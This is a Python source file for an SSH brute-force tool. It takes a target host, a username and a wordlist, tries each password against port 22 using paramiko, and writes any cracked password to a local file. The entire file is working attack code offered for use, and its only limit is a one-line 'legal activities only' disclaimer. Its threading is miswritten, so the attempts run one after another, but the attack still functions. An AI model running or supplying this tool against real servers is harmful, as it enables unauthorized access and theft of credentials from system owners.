#!/bin/python3
# -*- coding: utf-8 -*-
"""
Coded by parsa kazazi
@parsa_kazazi (Github, Twitter)

Quick and easy SSH Brute Force python3 script
Works on all operating systems
For legal activities only
Version: 1.0
"""

import os
import socket
import threading
import time

os_name = os.name

def clear():
    if (os_name == "nt"):
        os.system("cls")
    else:
        os.system("clear")

try:
    import paramiko
except:
    print("\nParamiko package not installed.\nTry: pip install paramiko\n")
    exit()

clear()
if (os_name == "nt"):
    os.system("@echo off")
    os.system("title SSH Brute")
else:
    os.system("printf '\033]2;SSH Brute\a'")

print("""
  ___   ___   _  _         ___   ___   _   _   _____   ___
 / __| / __| | || |  ___  | _ ) | _ \ | | | | |_   _| | __|
 \__ \ \__ \ | __ | |___| | _ \ |   / | |_| |   | |   | _|
 |___/ |___/ |_||_|       |___/ |_|_\  \___/    |_|   |___|

 SSH (Secure Shell) Brute Force Attack. Quick and easy

""")

put = str("\033[94m[*]\033[0m ")
info = str("\033[94m[i]\033[0m ")
good = str("\033[92m[+]\033[0m ")
error = str("\033[91m[!]\033[0m ")

hostname = input(put + "Target host: ")
username = input(put + "Username: ")
wordlist_filename = input(put + "Wordlist file (Enter to default): ")

if (wordlist_filename == ""):
    wordlist_filename = "passwords.txt"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # to create connection
ssh = paramiko.SSHClient() # making ssh client
try:
    ip_address = socket.gethostbyname(hostname)
    sock.connect((ip_address, 22)) # check the ssh connection
except:
    print(error + "SSH Connection to " + hostname + " failed")
    print(info + "Exiting\n")
    exit()
else:
    print(good + "SSH Connection to " + hostname + " successful")
try:
    wordlist_file = open(wordlist_filename, "r", encoding="latin-1").readlines()
except FileNotFoundError:
    print(error + '"' + wordlist_filename + '" : File not found\n')
    exit()
except UnicodeDecodeError:
    print(error + '"' + wordlist_filename + '" : Unicode decode error\n')
    exit()

time.sleep(2)
target = str(username + "@" + hostname)
print("\n" + info + "Attack Target  :  " + target)
print(info + "Wordlist file  :  " + wordlist_filename + "\n")
time.sleep(2)
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def login(ip_address, username, password):
    print(info + 'Checking password: "' + password + '"')
    try:
        ssh.connect(hostname=ip_address, username=username, password=password, timeout=3)
    except paramiko.AuthenticationException:
        pass
    except socket.timeout:
        print(error + "Host: " + hostname + " is timed out")
    except paramiko.ssh_exception.SSHException:
        print(error + "Error reading SSH protocol banner")
    else:
        print("\n" + good + "Password Cracked!")
        print(good + target + " password: " + password + "\n")
        with open(str(target + ".txt"), "w", encoding="utf-8") as f:
            f.write("Hostname: " + hostname + "\nUsername: " + username + "\nIP address: " + ip_address + "\nPassword: " + password)
        print(info + "Result was saved in file: " + target + ".txt\n")
        ssh.close()
        exit()

for password in wordlist_file:
    try:
        password = password.strip()
        thread = threading.Thread(login(ip_address, username, password))
        thread.daemon = True
        thread.start()
    except KeyboardInterrupt:
        print(info + "Exiting\n")
        exit()

print('\n' + error + 'Wordlist "' + wordlist_filename + '" cannot crack: ' + target)
print(error + "Password not found.\n")
